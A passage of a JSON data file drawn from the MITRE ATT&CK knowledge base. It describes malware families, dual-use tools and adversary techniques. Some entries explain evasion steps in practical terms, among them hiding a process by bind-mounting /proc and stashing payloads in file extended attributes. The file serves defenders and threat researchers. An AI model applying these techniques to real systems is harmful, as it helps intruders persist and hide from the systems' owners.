    "name": "CHIMNEYSWEEP",
    "description": "[CHIMNEYSWEEP](https://attack.mitre.org/software/S1149) is a backdoor malware that was deployed during [HomeLand Justice](https://attack.mitre.org/campaigns/C0038) along with [ROADSWEEP](https://attack.mitre.org/software/S1150) ransomware, and has been used to target Farsi and Arabic speakers since at least 2012.(Citation: Mandiant ROADSWEEP August 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CHIMNEYSWEEP"
    ],
    "id": "S1149"
  },
  "malware--6108f800-10b8-4090-944e-be579f01263d": {
    "name": "VPNFilter",
    "description": "[VPNFilter](https://attack.mitre.org/software/S1010) is a multi-stage, modular platform with versatile capabilities to support both intelligence-collection and destructive cyber attack operations. [VPNFilter](https://attack.mitre.org/software/S1010) modules such as its packet sniffer ('ps') can collect traffic that passes through an infected device, allowing the theft of website credentials and monitoring of Modbus SCADA protocols. (Citation: William Largent June 2018) (Citation: Carl Hurd March 2019) [VPNFilter](https://attack.mitre.org/software/S1010) was assessed to be replaced by [Sandworm Team](https://attack.mitre.org/groups/G0034) with [Cyclops Blink](https://attack.mitre.org/software/S0687) starting in 2019.(Citation: NCSC CISA Cyclops Blink Advisory February 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "VPNFilter"
    ],
    "id": "S1010"
  },
  "malware--6490afef-d88e-4e2b-b9d9-a472508ca59d": {
    "name": "LunarLoader",
    "description": "[LunarLoader](https://attack.mitre.org/software/S1143) is the loader component for the [LunarWeb](https://attack.mitre.org/software/S1141) and [LunarMail](https://attack.mitre.org/software/S1142) backdoors that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2020 including against a European ministry of foreign affairs (MFA). [LunarLoader](https://attack.mitre.org/software/S1143) has been observed as a standalone and as a part of trojanized open-source software such as AdmPwd.(Citation: ESET Turla Lunar toolset May 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LunarLoader"
    ],
    "id": "S1143"
  },
  "malware--663d7dee-5a47-459e-a5ef-e850a94a8ee5": {
    "name": "MultiLayer Wiper",
    "description": "[MultiLayer Wiper](https://attack.mitre.org/software/S1135) is wiper malware written in .NET associated with [Agrius](https://attack.mitre.org/groups/G1030) operations. Observed samples of [MultiLayer Wiper](https://attack.mitre.org/software/S1135) have an anomalous, future compilation date suggesting possible metadata manipulation.(Citation: Unit42 Agrius 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MultiLayer Wiper"
    ],
    "id": "S1135"
  },
  "malware--76fde8df-3495-47c9-82eb-125c4f7fb621": {
    "name": "Latrodectus",
    "description": "[Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been used since at least 2023 to download and execute additional payloads and modules. [Latrodectus](https://attack.mitre.org/software/S1160) has most often been distributed through email campaigns, primarily by [TA577](https://attack.mitre.org/groups/G1037) and [TA578](https://attack.mitre.org/groups/G1038), and has infrastructure overlaps with historic [IcedID](https://attack.mitre.org/software/S0483) operations.(Citation: Latrodectus APR 2024)(Citation: Bleeping Computer Latrodectus April 2024)(Citation: Bitsight Latrodectus June 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Latrodectus"
    ],
    "id": "S1160"
  },
  "malware--824a230d-0f6a-4fd0-99df-8d464db2265e": {
    "name": "Spica",
    "description": "[Spica](https://attack.mitre.org/software/S1140) is a custom backdoor written in Rust that has been used by [Star Blizzard](https://attack.mitre.org/groups/G1033) since at least 2023.(Citation: Google TAG COLDRIVER January 2024) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Spica"
    ],
    "id": "S1140"
  },
  "malware--8d1f89fd-4dde-40ab-80e0-a7b80249162e": {
    "name": "BPFDoor",
    "description": "[BPFDoor](https://attack.mitre.org/software/S1161) is a Linux based passive long-term backdoor used by China-based threat actors. First seen in 2021, [BPFDoor](https://attack.mitre.org/software/S1161) is named after its usage of Berkley Packet Filter (BPF) to execute single task instructions. [BPFDoor](https://attack.mitre.org/software/S1161) supports multiple protocols for communicating with a C2 including TCP, UDP, and ICMP and can start local or reverse shells that bypass firewalls using iptables.(Citation: Sandfly BPFDoor 2022)(Citation: Deep Instinct BPFDoor 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BPFDoor"
    ],
    "id": "S1161"
  },
  "malware--8d8518db-0f52-4f3c-8017-01389a8522bb": {
    "name": "ZeroCleare",
    "description": "[ZeroCleare](https://attack.mitre.org/software/S1151) is a wiper malware that has been used in conjunction with the [RawDisk](https://attack.mitre.org/software/S0364) driver since at least 2019 by suspected Iran-nexus threat actors including activity targeting the energy and industrial sectors in the Middle East and political targets in Albania.(Citation: Microsoft Albanian Government Attacks September 2022)(Citation: CISA Iran Albanian Attacks September 2022)(Citation: Mandiant ROADSWEEP August 2022)(Citation: IBM ZeroCleare Wiper December 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ZeroCleare"
    ],
    "id": "S1151"
  },
  "malware--a36eedea-9523-4abb-96e8-205f171ee763": {
    "name": "MgBot",
    "description": "[MgBot](https://attack.mitre.org/software/S1146) is a modular malware framework exclusively associated with [Daggerfly](https://attack.mitre.org/groups/G1034) operations since at least 2012. [MgBot](https://attack.mitre.org/software/S1146) was developed in C++ and features a module design with multiple available plugins that have been under active development through 2024.(Citation: Szappanos MgBot 2014)(Citation: ESET EvasivePanda 2023)(Citation: Symantec Daggerfly 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MgBot"
    ],
    "id": "S1146"
  },
  "malware--a5789a26-2b7b-4b2d-a25f-31182468d4bb": {
    "name": "LunarMail",
    "description": "[LunarMail](https://attack.mitre.org/software/S1142) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2020 including in a compromise of a European ministry of foreign affairs (MFA) in conjunction with [LunarLoader](https://attack.mitre.org/software/S1143) and [LunarWeb](https://attack.mitre.org/software/S1141). [LunarMail](https://attack.mitre.org/software/S1142) is designed to be deployed on workstations and can use email messages and [Steganography](https://attack.mitre.org/techniques/T1001/002) in command and control.(Citation: ESET Turla Lunar toolset May 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LunarMail"
    ],
    "id": "S1142"
  },
  "malware--b5a8fb8b-4ff1-43e5-a1ad-75ae565f5175": {
    "name": "Raccoon Stealer",
    "description": "[Raccoon Stealer](https://attack.mitre.org/software/S1148) is an information stealer malware family active since at least 2019 as a malware-as-a-service offering sold in underground forums. [Raccoon Stealer](https://attack.mitre.org/software/S1148) has experienced two periods of activity across two variants, from 2019 to March 2022, then resurfacing in a revised version in June 2022.(Citation: S2W Racoon 2022)(Citation: Sekoia Raccoon1 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Raccoon Stealer"
    ],
    "id": "S1148"
  },
  "malware--b5dc19b7-588d-403b-848d-c868bd61ffa1": {
    "name": "IPsec Helper",
    "description": "[IPsec Helper](https://attack.mitre.org/software/S1132) is a post-exploitation remote access tool linked to [Agrius](https://attack.mitre.org/groups/G1030) operations. This malware shares significant programming and functional overlaps with [Apostle](https://attack.mitre.org/software/S1133) ransomware, also linked to [Agrius](https://attack.mitre.org/groups/G1030). [IPsec Helper](https://attack.mitre.org/software/S1132) provides basic remote access tool functionality such as uploading files from victim systems, running commands, and deploying additional payloads.(Citation: SentinelOne Agrius 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "IPsec Helper"
    ],
    "id": "S1132"
  },
  "malware--be471c69-12d5-4bcc-9dad-3d42c3dbca4b": {
    "name": "ROADSWEEP",
    "description": "[ROADSWEEP](https://attack.mitre.org/software/S1150) is a ransomware that was deployed against Albanian government networks during [HomeLand Justice](https://attack.mitre.org/campaigns/C0038) along with the [CHIMNEYSWEEP](https://attack.mitre.org/software/S1149) backdoor.(Citation: Mandiant ROADSWEEP August 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ROADSWEEP"
    ],
    "id": "S1150"
  },
  "malware--d6aefbbf-fbef-485a-973e-b5403d8f8b18": {
    "name": "BFG Agonizer",
    "description": "[BFG Agonizer](https://attack.mitre.org/software/S1136) is a wiper related to the open-source project CRYLINE-v.5.0. The malware is associated with wiping operations conducted by the [Agrius](https://attack.mitre.org/groups/G1030) threat actor.(Citation: Unit42 Agrius 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BFG Agonizer"
    ],
    "id": "S1136"
  },
  "malware--dd2ad3d7-d7ef-4af5-a919-bfe8f2571705": {
    "name": "Manjusaka",
    "description": "[Manjusaka](https://attack.mitre.org/software/S1156) is a Chinese-language intrusion framework, similar to [Sliver](https://attack.mitre.org/software/S0633) and [Cobalt Strike](https://attack.mitre.org/software/S0154), with an ELF binary written in GoLang as the controller for Windows and Linux implants written in Rust. First identified in 2022, [Manjusaka](https://attack.mitre.org/software/S1156) consists of multiple components, only one of which (a command and control module) is freely available.(Citation: Talos Manjusaka 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Manjusaka"
    ],
    "id": "S1156"
  },
  "malware--e1284931-3f85-4262-a641-9ae8bb0576a0": {
    "name": "LunarWeb",
    "description": "[LunarWeb](https://attack.mitre.org/software/S1141) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2020 including in a compromise of a European ministry of foreign affairs (MFA) together with [LunarLoader](https://attack.mitre.org/software/S1143) and [LunarMail](https://attack.mitre.org/software/S1142). [LunarWeb](https://attack.mitre.org/software/S1141) has only been observed deployed against servers and can use [Steganography](https://attack.mitre.org/techniques/T1001/002) to obfuscate command and control.(Citation: ESET Turla Lunar toolset May 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LunarWeb"
    ],
    "id": "S1141"
  },
  "malware--f25d4207-25b2-4bb0-a17a-403943c670ad": {
    "name": "INC Ransomware",
    "description": "[INC Ransomware](https://attack.mitre.org/software/S1139) is a ransomware strain that has been used by the [INC Ransom](https://attack.mitre.org/groups/G1032) group since at least 2023 against multiple industry sectors worldwide. [INC Ransomware](https://attack.mitre.org/software/S1139) can employ partial encryption combined with multi-threading to speed encryption.(Citation: SentinelOne INC Ransomware)(Citation: Huntress INC Ransom Group August 2023)(Citation: Secureworks GOLD IONIC April 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "INC Ransomware"
    ],
    "id": "S1139"
  },
  "malware--f2e6af17-3828-4f10-88e7-343591618ddb": {
    "name": "DEADWOOD",
    "description": "[DEADWOOD](https://attack.mitre.org/software/S1134) is wiper malware written in C++ using Boost libraries. [DEADWOOD](https://attack.mitre.org/software/S1134) was first observed in an unattributed wiping event in Saudi Arabia in 2019, and has since been incorporated into [Agrius](https://attack.mitre.org/groups/G1030) operations.(Citation: SentinelOne Agrius 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DEADWOOD"
    ],
    "id": "S1134"
  },
  "tool--05fb53c8-e2ac-4e17-a0c9-a0825e1198bf": {
    "name": "Covenant",
    "description": "[Covenant](https://attack.mitre.org/software/S1155) is a multi-platform command and control framework written in .NET. While designed for penetration testing and security research, the tool has also been used by threat actors such as [HAFNIUM](https://attack.mitre.org/groups/G0125) during operations. [Covenant](https://attack.mitre.org/software/S1155) functions through a central listener managing multiple deployed \"Grunts\" that communicate back to the controller.(Citation: Github Covenant)(Citation: Microsoft HAFNIUM March 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Covenant"
    ],
    "id": "S1155"
  },
  "tool--0630d1a7-54da-4a48-a6af-eb8a62b13c17": {
    "name": "NPPSPY",
    "description": "NPPSPY is an implementation of a theoretical mechanism first presented in 2004 for capturing credentials submitted to a Windows system via a rogue Network Provider API item. NPPSPY captures credentials following submission and writes them to a file on the victim system for follow-on exfiltration.(Citation: Huntress NPPSPY 2022)(Citation: Polak NPPSPY 2004)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "NPPSPY"
    ],
    "id": "S1131"
  },
  "tool--36dd807e-b5bc-4c3e-91ed-80682360148c": {
    "name": "FRP",
    "description": "[FRP](https://attack.mitre.org/software/S1144), which stands for Fast Reverse Proxy, is an openly available tool that is capable of exposing a server located behind a firewall or Network Address Translation (NAT) to the Internet. [FRP](https://attack.mitre.org/software/S1144) can support multiple protocols including TCP, UDP, and HTTP(S) and has been abused by threat actors to proxy command and control communications.(Citation: FRP GitHub)(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023)(Citation: RedCanary Mockingbird May 2020)(Citation: DFIR Phosphorus November 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FRP"
    ],
    "id": "S1144"
  },
  "attack-pattern--278716b1-61ce-4a74-8d17-891d0c494101": {
    "name": "Browser Extensions",
    "example_uses": [
      "utilizes malicious Google Chrome browser extensions to steal financial data.",
      "has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.",
      "can install malicious Safari browser extensions to serve ads.",
      "has installed a malicious browser extension to target Google Chrome Microsoft Edge Opera and Brave browsers for the purpose of stealing data.",
      "has the ability to capture credentials cookies browser screenshots etc. and to exfiltrate data.",
      "can use malicious browser extensions to steal cookies and other user information.",
      "can install malicious browser extensions that are used to hijack user searches."
    ],
    "description": "Adversaries may abuse internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality to and customize aspects of internet browsers. They can be installed directly via a local file or custom URL or through a browser's app store - an official online platform where users can browse, install, and manage extensions for a specific web browser. Extensions generally inherit the web browser's permissions previously granted.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)  Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores, so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary-controlled server or manipulate the mobile configuration file to silently install additional extensions.   Previous to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files. In macOS 11+, the use of the profiles tool can no longer install configuration profiles; however, .mobileconfig files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)  Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation: Browers FriarFox)(Citation: Browser Adrozek) ",
    "similar_words": [
      "Browser Extensions"
    ],
    "id": "T1176.001"
  },
  "attack-pattern--31e5011f-090e-45be-9bb6-17a1c5e8219b": {
    "name": "ESXi Administration Command",
    "example_uses": [],
    "description": "Adversaries may abuse ESXi administration services to execute commands on guest machines hosted within an ESXi virtual environment. Persistent background services on ESXi-hosted VMs, such as the VMware Tools Daemon Service, allow for remote management from the ESXi server. The tools daemon service runs as `vmtoolsd.exe` on Windows guest operating systems, `vmware-tools-daemon` on macOS, and `vmtoolsd ` on Linux.(Citation: Broadcom VMware Tools Services) Adversaries may leverage a variety of tools to execute commands on ESXi-hosted VMs  for example, by using the vSphere Web Services SDK to programmatically execute commands and scripts via APIs such as `StartProgramInGuest`, `ListProcessesInGuest`,  `ListFileInGuest`, and `InitiateFileTransferFromGuest`.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Broadcom Running Guest OS Operations) This may enable follow-on behaviors on the guest VMs, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083), [Data from Local System](https://attack.mitre.org/techniques/T1005), or [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). ",
    "similar_words": [
      "ESXi Administration Command"
    ],
    "id": "T1675"
  },
  "attack-pattern--4b46767d-4a61-4f30-995e-c19a75c2e536": {
    "name": "Systemctl",
    "example_uses": [
      "has created system services to execute cryptocurrency mining software."
    ],
    "description": "Adversaries may abuse systemctl to execute commands or programs. Systemctl is the primary interface for systemd, the Linux init system and service manager. Typically invoked from a shell, Systemctl can also be integrated into scripts or applications.   Adversaries may use systemctl to execute commands or programs as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s. Common subcommands include: `systemctl start`, `systemctl stop`, `systemctl enable`, `systemctl disable`, and `systemctl status`.(Citation: Red Hat Systemctl 2022)",
    "similar_words": [
      "Systemctl"
    ],
    "id": "T1569.003"
  },
  "attack-pattern--514dc7b3-0b80-4382-80a9-2e2d294f5019": {
    "name": "Overwrite Process Arguments",
    "example_uses": [
      "overwrites the `argv selects a name from 10 hardcoded names that resemble Linux system daemons such as; `/sbin/udevd -d` `dbus-daemon --system` `avahi-daemon: chroot helper` `/sbin/auditd -n` and `/usr/lib/systemd/systemd-journald`."
    ],
    "description": "Adversaries may modify a process's in-memory arguments to change its name in order to appear as a legitimate or benign process. On Linux, the operating system stores command-line arguments in the processs stack and passes them to the `main()` function as the `argv` array. The first element, `argv[0]`, typically contains the process name or path - by default, the command used to actually start the process (e.g., `cat /etc/passwd`). By default, the Linux `/proc` filesystem uses this value to represent the process name. The `/proc/<PID>/cmdline` file reflects the contents of this memory, and tools like `ps` use it to display process information. Since arguments are stored in user-space memory at launch, this modification can be performed without elevated privileges. During runtime, adversaries can erase the memory used by all command-line arguments for a process, overwriting each argument string with null bytes. This removes evidence of how the process was originally launched. They can then write a spoofed string into the memory region previously occupied by `argv[0]` to mimic a benign command, such as `cat resolv.conf`. The new command-line string is reflected in `/proc/<PID>/cmdline` and displayed by tools like `ps`.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022) ",
    "similar_words": [
      "Overwrite Process Arguments"
    ],
    "id": "T1036.011"
  },
  "attack-pattern--5bd41255-a224-4425-a2e2-e9d293eafe1c": {
    "name": "Bind Mounts",
    "example_uses": [
      "leveraged a bind mount to bind itself to the `/proc/` file path before deleting its files from the `/tmp/` directory."
    ],
    "description": "Adversaries may abuse bind mounts on file structures to hide their activity and artifacts from native utilities. A bind mount maps a directory or file from one location on the filesystem to another, similar to a shortcut on Windows. Its commonly used to provide access to specific files or directories across different environments, such as inside containers or chroot environments, and requires sudo access. Adversaries may use bind mounts to map either an empty directory or a benign `/proc` directory to a malicious processs `/proc` directory. Using the commands `mount o bind /proc/benign-process /proc/malicious-process` (or `mount B`), the malicious process's `/proc` directory is overlayed with the contents of a benign process's `/proc` directory. When system utilities query process activity, such as `ps` and `top`, the kernel follows the bind mount and presents the benign directorys contents instead of the malicious process's actual `/proc` directory. As a result, these utilities display information that appears to come from the benign process, effectively hiding the malicious process's metadata, executable, or other artifacts from detection.(Citation: Cado Security Commando Cat 2024)(Citation: Ahn Lab CoinMiner 2023)",
    "similar_words": [
      "Bind Mounts"
    ],
    "id": "T1564.013"
  },
  "attack-pattern--63e3d25c-d57d-407d-8e6a-2cecd71f90be": {
    "name": "Input Injection",
    "example_uses": [
      "FIN7 has used malicious USBs to emulate keystrokes to launch PowerShell to download and execute malware from the adversary's server."
    ],
    "description": "Adversaries may simulate keystrokes on a victims computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts,  typing an inline script to be executed, or interacting directly with a GUI-based application.  These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs).For example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions.(Citation: BleepingComputer BackSwap)(Citation: welivesecurity BackSwap)Adversaries have also used malicious USB devices to emulate keystrokes that launch PowerShell, leading to the download and execution of malware from adversary-controlled servers.(Citation: BleepingComputer USB)",
    "similar_words": [
      "Input Injection"
    ],
    "id": "T1674"
  },
  "attack-pattern--66b34be7-6915-4b83-8d5a-b0f0592b5e41": {
    "name": "IDE Extensions",
    "example_uses": [],
    "description": "Adversaries may abuse an integrated development environment (IDE) extension to establish persistent access to victim systems.(Citation: Mnemonic misuse visual studio) IDEs such as Visual Studio Code, IntelliJ IDEA, and Eclipse support extensions - software components that add features like code linting, auto-completion, task automation, or integration with tools like Git and Docker. A malicious extension can be installed through an extension marketplace (i.e., [Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001)) or side-loaded directly into the IDE.(Citation: Abramovsky VSCode Security)(Citation: Lakshmanan Visual Studio Marketplace)   In addition to installing malicious extensions, adversaries may also leverage benign ones. For example, adversaries may establish persistent SSH tunnels via the use of the VSCode Remote SSH extension (i.e., [IDE Tunneling](https://attack.mitre.org/techniques/T1219/001)).  Trust is typically established through the installation process; once installed, the malicious extension is run every time that the IDE is launched. The extension can then be used to execute arbitrary code, establish a backdoor, mine cryptocurrency, or exfiltrate data.(Citation: ExtensionTotal VSCode Extensions  2025)",
    "similar_words": [
      "IDE Extensions"
    ],
    "id": "T1176.002"
  },
  "attack-pattern--671cd17f-a765-48fd-adc4-dad1941b1ae3": {
    "name": "Junk Code Insertion",
    "example_uses": [
      "has inserted large blocks of junk code including some components to decrypt strings and other important information for later in the encryption process.",
      "A version of  introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.",
      "variants have included excessive mathematical functions padding the binary and slowing execution for anti-analysis and sandbox evasion purposes.",
      "has used random junk code to obfuscate malware code.",
      "has obfuscated .NET executables by inserting junk code.",
      "contains junk code in its binary likely to confuse malware analysts.",
      "has obfuscated DLLs and functions using dummy API calls inserted between real instructions.",
      "obfuscates memory flow by adding junk instructions when executing to make analysis more difficult.",
      "has used garbage code to pad some of its malware components.",
      "decrypter have been inflated with junk code in between legitimate API functions and also included infinite loops to avoid analysis.",
      "contains junk code to increase its entropy and hide the actual code.",
      "contains unused machine instructions in a likely attempt to hinder analysis.",
      "contains junk code in its functions in an effort to confuse disassembly programs.",
      "includes garbage code to mislead anti-malware software and researchers.",
      "has used junk code within their DLL files to hinder analysis.",
      "can use junk code to hide functions and evade detection.",
      "has used useless code blocks to counter analysis.",
      "has been packed with junk code and strings."
    ],
    "description": "Adversaries may use junk code / dead code to obfuscate a malwares functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with [Compression](https://attack.mitre.org/techniques/T1027/015) or [Software Packing](https://attack.mitre.org/techniques/T1027/002).(Citation: ReasonLabs)(Citation: ReasonLabs Cyberpedia Junk Code)No-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them.(Citation: ReasonLabs)The use of junk / dead code insertion is distinct from [Binary Padding](https://attack.mitre.org/techniques/T1027/001) because the purpose is to obfuscate the functionality of the code, rather than simply to change the malwares signature.   ",
    "similar_words": [
      "Junk Code Insertion"
    ],
    "id": "T1027.016"
  },
  "attack-pattern--6bc7f9aa-b91f-4b23-84b8-5e756eba68eb": {
    "name": "Virtual Machine Discovery",
    "example_uses": [
      "Cheerscrypt has leveraged `esxcli vm process list` in order to gather a list of running virtual machines to terminate them."
    ],
    "description": "An adversary may attempt to enumerate running virtual machines (VMs) after gaining access to a host or hypervisor. For example, adversaries may enumerate a list of VMs on an ESXi hypervisor using a [Hypervisor CLI](https://attack.mitre.org/techniques/T1059/012) such as `esxcli` or `vim-cmd` (e.g. `esxcli vm process list or vim-cmd vmsvc/getallvms`).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: TrendMicro Play) Adversaries may also directly leverage a graphical user interface, such as VMware vCenter, in order to view virtual machines on a host. Adversaries may use the information from [Virtual Machine Discovery](https://attack.mitre.org/techniques/T1673) during discovery to shape follow-on behaviors. Subsequently discovered VMs may be leveraged for follow-on activities such as [Service Stop](https://attack.mitre.org/techniques/T1489) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
    "similar_words": [
      "Virtual Machine Discovery"
    ],
    "id": "T1673"
  },
  "attack-pattern--762e6f29-a62f-4d96-91ed-d0073181431f": {
    "name": "Extended Attributes",
    "example_uses": [],
    "description": "Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools like `Finder`,  `ls`, or `cat` and require utilities such as `xattr` (macOS) or `getfattr` (Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such as `user.` (user permissions), `trusted.` (root permissions), `security.`, and `system.`, each with specific permissions. On macOS, xattrs are flat strings without namespace prefixes, commonly prefixed with `com.apple.*` (e.g., `com.apple.quarantine`, `com.apple.metadata:_kMDItemUserTags`) and used by system features like Gatekeeper and Spotlight.(Citation: Establishing persistence using extended attributes on Linux)An adversary may leverage xattrs by embedding a second-stage payload into the extended attribute of a legitimate file. On macOS, a payload can be embedded into a custom attribute using the `xattr` command. A separate loader can retrieve the attribute with `xattr -p`, decode the content, and execute it using a scripting interpreter. On Linux, an adversary may use `setfattr` to write a payload into the `user.` namespace of a legitimate file. A loader script can later extract the payload with `getfattr --only-values`, decode it, and execute it using bash or another interpreter. In both cases, because the primary file content remains unchanged, security tools and integrity checks that do not inspect extended attributes will observe the original file hash, allowing the malicious payload to evade detection.(Citation: Low GroupIB xattrs nov 2024)",
    "similar_words": [
      "Extended Attributes"
    ],
    "id": "T1564.014"
  },
  "attack-pattern--77e29a47-e263-4f11-8692-e5012f44dbac": {
    "name": "IDE Tunneling",
    "example_uses": [],
    "description": "Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on remote systems as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g., `code tunnel`) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal.(Citation: sentinelone operationDigitalEye Dec 2024)(Citation: Unit42 Chinese VSCode 06 September 2024)(Citation: Thornton tutorial VSCode shell September 2023)Additionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries may configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network.IDE tunneling tools may be built-in or installed as [IDE Extensions](https://attack.mitre.org/techniques/T1176/002).",
    "similar_words": [
      "IDE Tunneling"
    ],
    "id": "T1219.001"
  },
  "attack-pattern--78b9e70d-1605-459c-b23d-e3a25036968c": {
    "name": "SVG Smuggling",
    "example_uses": [],
    "description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files.(Citation: Trustwave SVG Smuggling 2025) SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include `<script>` tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files. SVG smuggling can take a number of forms. For example, threat actors may include content that: * Assembles malicious payloads(Citation: Talos SVG Smuggling 2022)* Downloads malicious payloads(Citation: Cofense SVG Smuggling 2024)* Redirects users to malicious websites(Citation: Bleeping Computer SVG Smuggling 2024)* Displays interactive content to users, such as fake login forms and download buttons.(Citation: Bleeping Computer SVG Smuggling 2024)SVG Smuggling may be used in conjunction with [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) where an SVG with a malicious payload is included inside an HTML file.(Citation: Talos SVG Smuggling 2022) SVGs may also be included in other types of documents, such as PDFs.  ",
    "similar_words": [
      "SVG Smuggling"
    ],
    "id": "T1027.017"
  },
  "attack-pattern--7d356151-a69d-404e-896b-71618952702a": {
    "name": "JamPlus",
    "example_uses": [],
    "description": "Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual)Adversaries may abuse the `JamPlus` build utility to execute malicious scripts via a `.jam` file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.(Citation: Cyble)(Citation: Elastic Security Labs)",
    "similar_words": [
      "JamPlus"
    ],
    "id": "T1127.003"
  },
  "attack-pattern--a9fb6b3f-4a3c-4703-a4f1-f55f83d1e017": {
    "name": "Remote Access Hardware",
    "example_uses": [],
    "description": "An adversary may use legitimate remote access hardware to establish an interactive command and control channel to target systems within networks. These services, including IP-based keyboard, video, or mouse (KVM) devices such as TinyPilot and PiKVM, are commonly used as legitimate tools and may be allowed by peripheral device policies within a target environment.  Remote access hardware may be physically installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote session with the target system. Using hardware-based remote access tools may allow threat actors to bypass software security solutions and gain more control over the compromised device(s).(Citation: Palo Alto Unit 42 North Korean IT Workers 2024)(Citation: Google Cloud Threat Intelligence DPRK IT Workers 2024)",
    "similar_words": [
      "Remote Access Hardware"
    ],
    "id": "T1219.003"
  },
  "attack-pattern--bed81616-3dde-4685-be6e-ba9820f9a7ed": {
    "name": "Email Bombing",
    "example_uses": [
